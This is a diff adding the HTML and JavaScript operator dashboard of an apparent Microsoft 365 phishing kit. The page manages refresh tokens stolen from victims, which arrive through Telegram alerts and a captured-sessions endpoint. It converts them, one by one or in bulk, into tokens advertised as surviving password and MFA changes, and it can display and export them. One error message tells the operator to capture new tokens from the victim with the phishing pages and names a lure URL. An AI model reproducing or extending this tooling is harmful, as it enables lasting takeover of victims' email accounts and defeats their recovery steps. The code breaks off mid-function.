@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Manager - Persistent Access Control</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #4caf50;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            margin-top: 10px;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .tab {
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: all 0.3s;
+        }
+
+        .tab:hover {
+            background: rgba(255,255,255,0.2);
+            transform: translateY(-2px);
+        }
+
+        .tab.active {
+            background: white;
+            color: #667eea;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        /* Cards */
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            border-left: 4px solid #667eea;
+            padding-left: 15px;
+        }
+
+        .card h3 {
+            color: #555;
+            margin: 15px 0 10px 0;
+            font-size: 1.1em;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            font-family: monospace;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            font-family: monospace;
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 500;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button.secondary {
+            background: #6c757d;
+        }
+
+        button.danger {
+            background: #dc3545;
+        }
+
+        button.success {
+            background: #28a745;
+        }
+
+        /* Tables */
+        .table-container {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        th {
+            background: #f8f9fa;
+            font-weight: 600;
+            color: #555;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        /* Status Badges */
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            font-weight: 500;
+        }
+
+        .status-valid {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-expired {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .status-warning {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        /* Alert Messages */
+        .alert {
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(-20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border-left: 4px solid #28a745;
+        }
+
+        .alert-error {
+            background: #f8d7da;
+            color: #721c24;
+            border-left: 4px solid #dc3545;
+        }
+
+        .alert-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border-left: 4px solid #17a2b8;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Grid Layout */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 20px;
+        }
+
+        /* Code Block */
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: help;
+        }
+
+        .tooltip .tooltip-text {
+            visibility: hidden;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 5px 10px;
+            border-radius: 6px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+            font-size: 12px;
+        }
+
+        .tooltip:hover .tooltip-text {
+            visibility: visible;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+            
+            .tabs {
+                flex-direction: column;
+            }
+            
+            .tab {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Persistent Token Manager</h1>
+            <p>CAE-Enabled Token Management System</p>
+            <div class="badge">✅ Survives Password & MFA Changes</div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('migrate')">📥 Migrate Token</button>
+            <button class="tab" onclick="switchTab('bulk')">📦 Bulk Migration</button>
+            <button class="tab" onclick="switchTab('sessions')">📋 Active Sessions</button>
+            <button class="tab" onclick="switchTab('status')">🔍 Check Status</button>
+            <button class="tab" onclick="switchTab('test')">🧪 Test Token</button>
+            <button class="tab" onclick="switchTab('export')">📤 Export Tokens</button>
+        </div>
+
+        <!-- Migrate Single Token Tab -->
+        <div id="migrateTab" class="tab-content">
+            <div class="card">
+                <h2>📥 Migrate Single Token to Persistent System</h2>
+                <p style="color: #666; margin-bottom: 20px;">Convert existing tokens to CAE-enabled tokens that survive password and MFA changes</p>
+                
+                <div class="form-group">
+                    <label>Session ID *</label>
+                    <input type="text" id="sessionId" placeholder="e.g., dual_1234567890_abc123" autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label>Refresh Token *</label>
+                    <textarea id="refreshToken" placeholder="Paste your refresh token here..."></textarea>
+                    <small style="color: #666; display: block; margin-top: 5px;">The refresh token is required for persistent access</small>
+                </div>
+                
+                <div class="form-group">
+                    <label>Resource Type</label>
+                    <select id="resourceType">
+                        <option value="outlook">Outlook API</option>
+                        <option value="graph">Microsoft Graph</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Email (Optional)</label>
+                    <input type="email" id="email" placeholder="user@example.com">
+                </div>
+                
+                <button onclick="migrateToken()" id="migrateBtn">🚀 Migrate Token</button>
+                <div id="migrateResult"></div>
+            </div>
+            
+            <div class="card">
+                <h2>📖 Instructions</h2>
+                <div class="code-block">
+                    <strong>How to get your refresh token:</strong><br><br>
+                    1. From Telegram: Look for messages with "90-DAY DESKTOP TOKENS CAPTURED"<br>
+                    2. From captured sessions: Check /captured-sessions endpoint<br>
+                    3. From database: Look for refresh_token fields in your stored data<br><br>
+                    <strong>Example token format:</strong><br>
+                    0.ARgA4QcAAAABdFJpR2lQcGVhTF9hVUVXeHZVeWlfdFR...
+                </div>
+            </div>
+        </div>
+
+        <!-- Bulk Migration Tab -->
+        <div id="bulkTab" class="tab-content" style="display: none;">
+            <div class="card">
+                <h2>📦 Bulk Migrate All Tokens</h2>
+                <p style="color: #666; margin-bottom: 20px;">Automatically scan all existing sessions and migrate valid refresh tokens</p>
+                
+                <button onclick="bulkMigrate()" id="bulkMigrateBtn" class="success">🔄 Start Bulk Migration</button>
+                <div id="bulkResult"></div>
+            </div>
+            
+            <div class="card">
+                <h2>📊 Migration Statistics</h2>
+                <div id="stats" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 15px;">
+                    <div style="text-align: center; padding: 15px; background: #f8f9fa; border-radius: 10px;">
+                        <div style="font-size: 2em; font-weight: bold;" id="totalSessions">-</div>
+                        <div style="color: #666;">Total Sessions</div>
+                    </div>
+                    <div style="text-align: center; padding: 15px; background: #d4edda; border-radius: 10px;">
+                        <div style="font-size: 2em; font-weight: bold; color: #155724;" id="migratedSessions">-</div>
+                        <div style="color: #155724;">Migrated</div>
+                    </div>
+                    <div style="text-align: center; padding: 15px; background: #f8d7da; border-radius: 10px;">
+                        <div style="font-size: 2em; font-weight: bold; color: #721c24;" id="failedSessions">-</div>
+                        <div style="color: #721c24;">Failed</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Active Sessions Tab -->
+        <div id="sessionsTab" class="tab-content" style="display: none;">
+            <div class="card">
+                <h2>📋 Active Persistent Sessions</h2>
+                <button onclick="loadSessions()" style="margin-bottom: 20px;">🔄 Refresh List</button>
+                <div id="sessionsList">
+                    <div style="text-align: center; padding: 40px; color: #999;">
+                        Loading sessions...
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Check Status Tab -->
+        <div id="statusTab" class="tab-content" style="display: none;">
+            <div class="card">
+                <h2>🔍 Check Token Status</h2>
+                <div class="form-group">
+                    <label>Session ID *</label>
+                    <input type="text" id="statusSessionId" placeholder="Enter session ID">
+                </div>
+                <button onclick="checkStatus()">🔍 Check Status</button>
+                <div id="statusResult"></div>
+            </div>
+        </div>
+
+        <!-- Test Token Tab -->
+        <div id="testTab" class="tab-content" style="display: none;">
+            <div class="card">
+                <h2>🧪 Test Token Validity</h2>
+                <div class="form-group">
+                    <label>Session ID *</label>
+                    <input type="text" id="testSessionId" placeholder="Enter session ID">
+                </div>
+                <div class="form-group">
+                    <label>Resource Type</label>
+                    <select id="testResource">
+                        <option value="outlook">Outlook API</option>
+                        <option value="graph">Microsoft Graph</option>
+                    </select>
+                </div>
+                <button onclick="testToken()">🧪 Test Token</button>
+                <div id="testResult"></div>
+            </div>
+        </div>
+
+        <!-- Export Tokens Tab -->
+        <div id="exportTab" class="tab-content" style="display: none;">
+            <div class="card">
+                <h2>📤 Export Tokens</h2>
+                <div class="form-group">
+                    <label>Session ID *</label>
+                    <input type="text" id="exportSessionId" placeholder="Enter session ID">
+                </div>
+                <button onclick="exportTokens()">📤 Export Tokens</button>
+                <div id="exportResult"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin;
+        
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.style.display = 'none';
+            });
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected tab
+            document.getElementById(`${tabName}Tab`).style.display = 'block';
+            
+            // Add active class to clicked tab
+            event.target.classList.add('active');
+            
+            // Load data if needed
+            if (tabName === 'sessions') {
+                loadSessions();
+            } else if (tabName === 'bulk') {
+                loadStats();
+            }
+        }
+        
+        function showAlert(message, type, targetId) {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type}`;
+            alertDiv.innerHTML = message;
+            alertDiv.style.marginTop = '20px';
+            
+            const target = document.getElementById(targetId);
+            target.innerHTML = '';
+            target.appendChild(alertDiv);
+            
+            setTimeout(() => {
+                alertDiv.remove();
+            }, 5000);
+        }
+        
+        async function migrateToken() {
+            const sessionId = document.getElementById('sessionId').value.trim();
+            const refreshToken = document.getElementById('refreshToken').value.trim();
+            const resource = document.getElementById('resourceType').value;
+            const email = document.getElementById('email').value.trim();
+            
+            if (!sessionId || !refreshToken) {
+                showAlert('❌ Please fill in all required fields', 'error', 'migrateResult');
+                return;
+            }
+            
+            const migrateBtn = document.getElementById('migrateBtn');
+            migrateBtn.disabled = true;
+            migrateBtn.innerHTML = '<span class="spinner"></span> Migrating...';
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/migrate-token/${sessionId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        refreshToken: refreshToken,
+                        resource: resource
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showAlert(`
+                        ✅ <strong>Migration Successful!</strong><br>
+                        Token Type: ${resource}<br>
+                        Expires: ${new Date(data.tokenStatus.expiresAt).toLocaleString()}<br>
+                        Status: ${data.message}
+                    `, 'success', 'migrateResult');
+                    
+                    // Clear form
+                    document.getElementById('sessionId').value = '';
+                    document.getElementById('refreshToken').value = '';
+                    document.getElementById('email').value = '';
+                } else {
+                    showAlert(`❌ Migration Failed: ${data.error}`, 'error', 'migrateResult');
+                }
+            } catch (error) {
+                showAlert(`❌ Error: ${error.message}`, 'error', 'migrateResult');
+            } finally {
+                migrateBtn.disabled = false;
+                migrateBtn.innerHTML = '🚀 Migrate Token';
+            }
+        }
+
+
+        async function checkStatusById(sessionId) {
+    try {
+        const response = await fetch(`${API_BASE}/api/token-status/${sessionId}?test=true`);
+        const data = await response.json();
+        
+        if (data.status === 'not_migrated') {
+            // Session exists but not migrated
+            let html = '<div style="margin-top: 20px;">';
+            html += `<div class="alert alert-info">📋 Session found: <code>${sessionId}</code></div>`;
+            html += `<div class="alert alert-warning">
+                ⚠️ This session has not been migrated to the persistent system yet.<br><br>
+                <strong>Available tokens:</strong><br>
+                • Outlook: ${data.availableTokens.hasOutlook ? '✅' : '❌'}<br>
+                • Graph: ${data.availableTokens.hasGraph ? '✅' : '❌'}<br>
+                • Desktop: ${data.availableTokens.hasDesktop ? '✅' : '❌'}<br><br>
+                ${data.hasRefreshToken ? 
+                    '✅ Refresh token available! You can migrate this session.' : 
+                    '❌ No refresh token found. Cannot migrate.'}
+            </div>`;
+            
+            if (data.hasRefreshToken) {
+                html += `
+                    <div style="margin-top: 20px;">
+                        <button onclick="migrateFromStatus('${sessionId}')" class="success">
+                            🔄 Migrate This Session
+                        </button>
+                        <button onclick="showRefreshToken('${sessionId}')" style="margin-left: 10px;">
+                            📋 Show Refresh Token
+                        </button>
+                    </div>
+                `;
+            }
+            
+            html += '</div>';
+            document.getElementById('statusResult').innerHTML = html;
+            return;
+        }
+        
+        if (data.tokenStatus) {
+            let html = '<div style="margin-top: 20px;">';
+            html += `<div class="alert alert-info">✅ Token Status for session: <code>${sessionId}</code></div>`;
+            html += '<div class="grid-2">';
+            
+            for (const [resource, status] of Object.entries(data.tokenStatus)) {
+                const validClass = status.valid ? 'status-valid' : 'status-expired';
+                const validText = status.valid ? '✅ Valid' : '❌ Expired';
+                
+                html += `
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 10px;">
+                        <h3>${resource.toUpperCase()}</h3>
+                        <p><strong>Status:</strong> <span class="status-badge ${validClass}">${validText}</span></p>
+                        <p><strong>Expires In:</strong> ${Math.floor(status.expiresIn / 60)} minutes (${status.expiresIn} seconds)</p>
+                        <p><strong>Expires At:</strong> ${new Date(status.expiresAt).toLocaleString()}</p>
+                        <p><strong>Last Refresh:</strong> ${new Date(status.lastRefresh).toLocaleString()}</p>
+                        <p><strong>Refresh Count:</strong> ${status.refreshCount}</p>
+                        <p><strong>CAE Enabled:</strong> ${status.caeEnabled ? '✅ Yes' : '❌ No'}</p>
+                        <p><strong>Scopes:</strong> ${status.scopes}</p>
+                    </div>
+                `;
+            }
+            
+            html += '</div>';
+            
+            if (data.tokenStatus.outlook?.testResult) {
+                const test = data.tokenStatus.outlook.testResult;
+                if (test.valid) {
+                    html += `<div class="alert alert-success" style="margin-top: 20px;">
+                        ✅ Test successful! Token can access: ${test.user?.userPrincipalName || test.user?.mail || 'User profile'}
+                    </div>`;
+                } else if (test.requiresClaimsRefresh) {
+                    html += `<div class="alert alert-warning" style="margin-top: 20px;">
+                        ⚠️ Claims challenge detected - token will auto-refresh on next use
+                    </div>`;
+                }
+            }
+            
+            html += '</div>';
+            document.getElementById('statusResult').innerHTML = html;
+        } else {
+            document.getElementById('statusResult').innerHTML = `
+                <div class="alert alert-error">
+                    ❌ No tokens found for this session
+                </div>
+            `;
+        }
+    } catch (error) {
+        document.getElementById('statusResult').innerHTML = `
+            <div class="alert alert-error">
+                ❌ Error checking status: ${error.message}
+            </div>
+        `;
+    }
+}
+
+async function migrateFromStatus(sessionId) {
+    // First, get the session data to extract refresh token
+    try {
+        const response = await fetch(`${API_BASE}/debug-cookies/${sessionId}`);
+        const data = await response.json();
+        
+        let refreshToken = null;
+        let resource = 'outlook';
+        
+        // Try to find refresh token in various places
+        if (data.tokens?.outlook?.refresh_token) {
+            refreshToken = data.tokens.outlook.refresh_token;
+            resource = 'outlook';
+        } else if (data.tokens?.graph?.refresh_token) {
+            refreshToken = data.tokens.graph.refresh_token;
+            resource = 'graph';
+        } else if (data.tokens?.refresh_token) {
+            refreshToken = data.tokens.refresh_token;
+            resource = 'outlook';
+        }
+        
+        if (refreshToken) {
+            // Auto-fill the migrate form and trigger migration
+            document.getElementById('sessionId').value = sessionId;
+            document.getElementById('refreshToken').value = refreshToken;
+            document.getElementById('resourceType').value = resource;
+            if (data.credentials?.username) {
+                document.getElementById('email').value = data.credentials.username;
+            }
+            
+            // Switch to migrate tab
+            switchTab('migrate');
+            
+            // Trigger migration
+            await migrateToken();
+        } else {
+            showAlert('No refresh token found for this session', 'error', 'statusResult');
+        }
+    } catch (error) {
+        showAlert(`Error getting session data: ${error.message}`, 'error', 'statusResult');
+    }
+}
+
+async function showRefreshToken(sessionId) {
+    try {
+        const response = await fetch(`${API_BASE}/debug-cookies/${sessionId}`);
+        const data = await response.json();
+        
+        let refreshToken = null;
+        
+        if (data.tokens?.outlook?.refresh_token) {
+            refreshToken = data.tokens.outlook.refresh_token;
+        } else if (data.tokens?.graph?.refresh_token) {
+            refreshToken = data.tokens.graph.refresh_token;
+        } else if (data.tokens?.refresh_token) {
+            refreshToken = data.tokens.refresh_token;
+        }
+        
+        if (refreshToken) {
+            // Show refresh token in a modal or alert
+            const modalHtml = `
+                <div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; display: flex; align-items: center; justify-content: center;">
+                    <div style="background: white; padding: 30px; border-radius: 15px; max-width: 600px; width: 90%;">
+                        <h3>Refresh Token for Session: ${sessionId}</h3>
+                        <div class="code-block" style="margin: 20px 0; word-break: break-all;">${refreshToken}</div>
+                        <button onclick="copyToClipboard('${refreshToken}')" style="margin-right: 10px;">📋 Copy</button>
+                        <button onclick="this.parentElement.parentElement.remove()">Close</button>
+                    </div>
+                </div>
+            `;
+            
+            // Remove any existing modal
+            const existingModal = document.querySelector('[style*="position: fixed"][style*="z-index: 1000"]');
+            if (existingModal) existingModal.remove();
+            
+            // Add modal to body
+            document.body.insertAdjacentHTML('beforeend', modalHtml);
+        } else {
+            showAlert('No refresh token found for this session', 'error', 'statusResult');
+        }
+    } catch (error) {
+        showAlert(`Error: ${error.message}`, 'error', 'statusResult');
+    }
+}
+
+
+
+
+async function loadSessions() {
+    try {
+        // First try to get all sessions from captured-sessions
+        const allSessionsResponse = await fetch(`${API_BASE}/captured-sessions`);
+        const allSessions = await allSessionsResponse.json();
+        
+        // Then get persistent sessions
+        const persistentResponse = await fetch(`${API_BASE}/api/persistent-sessions`);
+        const persistentData = await persistentResponse.json();
+        
+        // Create a map of persistent sessions
+        const persistentMap = new Map();
+        if (persistentData.sessions) {
+            persistentData.sessions.forEach(s => persistentMap.set(s.sessionId, s));
+        }
+        
+        if (allSessions.sessions && allSessions.sessions.length > 0) {
+            let html = '<div class="table-container">';
+            html += '<table>';
+            html += '<thead><tr>';
+            html += '<th>Session ID</th>';
+            html += '<th>Email</th>';
+            html += '<th>Tokens Available</th>';
+            html += '<th>Persistent Status</th>';
+            html += '<th>Actions</th>';
+            html += '</tr></thead><tbody>';
+            
+            allSessions.sessions.forEach(session => {
+                const isPersistent = persistentMap.has(session.id);
+                const persistentSession = persistentMap.get(session.id);
+                
+                html += `<tr>
+                    <td><code>${session.id.substring(0, 30)}...</code></td>
+                    <td>${session.username || 'N/A'}</td>
+                    <td>
+                        ${session.hasOutlook ? '📧 Outlook ' : ''}
+                        ${session.hasGraph ? '🔄 Graph ' : ''}
+                        ${!session.hasOutlook && !session.hasGraph ? 'No tokens' : ''}
+                    </td>
+                    <td>
+                        ${isPersistent ? 
+                            '<span class="status-badge status-valid">✅ CAE-Enabled</span>' : 
+                            '<span class="status-badge status-warning">⚠️ Not Migrated</span>'
+                        }
+                    </td>
+                    <td>
+                        <button onclick="checkStatusById(\'${session.id}\')" style="padding: 5px 10px; font-size: 12px;">🔍 Check</button>
+                        ${!isPersistent && (session.hasOutlook || session.hasGraph) ? 
+                            `<button onclick="migrateFromStatus('${session.id}')" style="padding: 5px 10px; font-size: 12px; margin-top: 5px;">🔄 Migrate</button>` : 
+                            persistentSession && persistentSession.tokens?.outlook ?
+                            `<button onclick="testTokenById('${session.id}', 'outlook')" style="padding: 5px 10px; font-size: 12px; margin-top: 5px;">🧪 Test</button>` :
+                            ''
+                        }
+                    </td>
+                </tr>`;
+            });
+            
+            html += '</tbody></table>';
+            html += '</div>';
+            html += `<div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
+                <strong>📊 Summary:</strong><br>
+                Total Sessions: ${allSessions.total}<br>
+                Persistent Sessions: ${persistentData.total || 0}<br>
+                <small>✅ CAE-enabled tokens survive password and MFA changes</small>
+            </div>`;
+            
+            document.getElementById('sessionsList').innerHTML = html;
+        } else {
+            document.getElementById('sessionsList').innerHTML = `
+                <div style="text-align: center; padding: 40px; color: #999;">
+                    📭 No sessions found. Use the Migrate tab to add tokens.
+                </div>
+            `;
+        }
+    } catch (error) {
+        document.getElementById('sessionsList').innerHTML = `
+            <div class="alert alert-error">
+                ❌ Error loading sessions: ${error.message}
+            </div>
+        `;
+    }
+}
+
+
+
+async function migrateToken() {
+    const sessionId = document.getElementById('sessionId').value.trim();
+    const refreshToken = document.getElementById('refreshToken').value.trim();
+    const resource = document.getElementById('resourceType').value;
+    const email = document.getElementById('email').value.trim();
+    
+    if (!sessionId || !refreshToken) {
+        showAlert('❌ Please fill in all required fields', 'error', 'migrateResult');
+        return;
+    }
+    
+    const migrateBtn = document.getElementById('migrateBtn');
+    migrateBtn.disabled = true;
+    migrateBtn.innerHTML = '<span class="spinner"></span> Testing token...';
+    
+    // First, diagnose the token
+    try {
+        const diagnoseResponse = await fetch(`${API_BASE}/api/diagnose-token`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ refreshToken: refreshToken })
+        });
+        
+        const diagnosis = await diagnoseResponse.json();
+        
+        if (!diagnosis.valid) {
+            // Show detailed diagnosis
+            let errorHtml = '<div class="alert alert-error">';
+            errorHtml += '<strong>❌ Token is invalid or revoked</strong><br><br>';
+            errorHtml += '<strong>Diagnosis Results:</strong><br>';
+            
+            diagnosis.tests.forEach(test => {
+                errorHtml += `• ${test.name}: ${test.message}<br>`;
+            });
+            
+            if (diagnosis.reason) {
+                errorHtml += `<br><strong>Reason:</strong> ${diagnosis.reason}<br>`;
+            }
+            
+            errorHtml += '<br><strong>Common Causes:</strong><br>';
+            errorHtml += '• User changed their password (tokens are automatically revoked)<br>';
+            errorHtml += '• User signed out from "All Devices"<br>';
+            errorHtml += '• Token expired (refresh tokens last 90 days)<br>';
+            errorHtml += '• Admin revoked the session<br><br>';
+            
+            errorHtml += '<strong>Solution:</strong><br>';
+            errorHtml += 'You need to capture a new token from the victim using your phishing pages.<br>';
+            errorHtml += 'Navigate to: <code>/en-us/microsoft-365/outlook?email=target@example.com</code><br><br>';
+            
+            errorHtml += '<button onclick="document.getElementById(\'refreshToken\').value = \'\'; this.remove();" style="margin-top: 10px;">Clear Token</button>';
+            errorHtml += '</div>';
+            
+            document.getElementById('migrateResult').innerHTML = errorHtml;
+            migrateBtn.disabled = false;
+            migrateBtn.innerHTML = '🚀 Migrate Token';
+            return;
+        }
+        
+        // Token is valid, proceed with migration
+        migrateBtn.innerHTML = '<span class="spinner"></span> Migrating...';
+        
+        const response = await fetch(`${API_BASE}/api/migrate-token/${sessionId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                refreshToken: refreshToken,
+                resource: resource
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            showAlert(`
+                ✅ <strong>Migration Successful!</strong><br>
+                Token Type: ${resource}<br>
+                Expires: ${new Date(data.tokenStatus.expiresAt).toLocaleString()}<br>
+                Status: ${data.message}<br><br>
+                <strong>✅ This token will now survive password changes and MFA updates!</strong>
+            `, 'success', 'migrateResult');
+            
+            // Clear form
+            document.getElementById('sessionId').value = '';
+            document.getElementById('refreshToken').value = '';
+            document.getElementById('email').value = '';
+            
+            // Refresh sessions list if visible
+            if (document.getElementById('sessionsTab').style.display !== 'none') {
+                loadSessions();
+            }
+        } else {
+            let errorHtml = `<div class="alert alert-error">`;
+            errorHtml += `<strong>❌ Migration Failed</strong><br><br>`;
+            errorHtml += `<strong>Error:</strong> ${data.error}<br>`;
+            
+            if (data.solution) {
+                errorHtml += `<br><strong>Solution:</strong><br>${data.solution}<br>`;
+            }
+            
+            if (data.recommendations) {
+                errorHtml += `<br><strong>Recommendations:</strong><br>`;
+                data.recommendations.forEach(rec => {
+                    errorHtml += `• ${rec}<br>`;
+                });
+            }
+            
+            errorHtml += `</div>`;
+            document.getElementById('migrateResult').innerHTML = errorHtml;
+        }
+        
+    } catch (error) {
+        showAlert(`❌ Error: ${error.message}`, 'error', 'migrateResult');
+    } finally {
+        migrateBtn.disabled = false;
+        migrateBtn.innerHTML = '🚀 Migrate Token';
+    }
+}
+        
+        async function bulkMigrate() {
+            const bulkBtn = document.getElementById('bulkMigrateBtn');
+            bulkBtn.disabled = true;
+            bulkBtn.innerHTML = '<span class="spinner"></span> Migrating all tokens...';
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/migrate-all-tokens`, {
+                    method: 'POST'
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    let resultsHtml = '<div style="margin-top: 20px;">';
+                    resultsHtml += `<div class="alert alert-success">✅ Migration Complete!</div>`;
+                    resultsHtml += `<div class="grid-2" style="margin-top: 15px;">`;
+                    resultsHtml += `<div><strong>Total Sessions:</strong> ${data.total}</div>`;
+                    resultsHtml += `<div><strong>Migrated:</strong> ${data.migrated}</div>`;
+                    resultsHtml += `<div><strong>Failed:</strong> ${data.failed}</div>`;
+                    resultsHtml += `</div>`;
+                    
+                    if (data.results && data.results.length > 0) {
+                        resultsHtml += '<h3 style="margin-top: 20px;">Results:</h3>';
+                        resultsHtml += '<div class="table-container"><table>';
+                        resultsHtml += '<tr><th>Session ID</th><th>Resource</th><th>Status</th><th>Error</th></tr>';
+                        
+                        data.results.forEach(result => {
+                            resultsHtml += `<tr>
+                                <td><code>${result.sessionId}</code></td>
+                                <td>${result.resource}</td>
+                                <td><span class="status-badge ${result.status === 'success' ? 'status-valid' : 'status-expired'}">${result.status}</span></td>
+                                <td>${result.error || '-'}</td>
+                            </tr>`;
+                        });
+                        
+                        resultsHtml += '</table></div>';
+                    }
+                    
+                    resultsHtml += '</div>';
+                    document.getElementById('bulkResult').innerHTML = resultsHtml;
+                    
+                    // Refresh stats
+                    loadStats();
+                } else {
+                    showAlert('❌ Bulk migration failed', 'error', 'bulkResult');
+                }
+            } catch (error) {
+                showAlert(`❌ Error: ${error.message}`, 'error', 'bulkResult');
+            } finally {
+                bulkBtn.disabled = false;
+                bulkBtn.innerHTML = '🔄 Start Bulk Migration';
+            }
+        }
+        
+        async function loadSessions() {
+            try {
+                const response = await fetch(`${API_BASE}/api/persistent-sessions`);
+                const data = await response.json();
+                
+                if (data.sessions && data.sessions.length > 0) {
+                    let html = '<div class="table-container"><table>';
+                    html += '<tr><th>Session ID</th><th>Email</th><th>Outlook Status</th><th>Graph Status</th><th>Expires In</th><th>Actions</th></tr>';
+                    
+                    data.sessions.forEach(session => {
+                        const outlookStatus = session.tokens.outlook;
+                        const graphStatus = session.tokens.graph;
+                        
+                        html += `<tr>
+                            <td><code>${session.sessionId.substring(0, 20)}...</code></td>
+                            <td>${session.email || 'N/A'}</td>
+                            <td>
+                                ${outlookStatus ? 
+                                    `<span class="status-badge ${outlookStatus.valid ? 'status-valid' : 'status-expired'}">
+                                        ${outlookStatus.valid ? '✅ Valid' : '❌ Expired'}
+                                    </span><br>
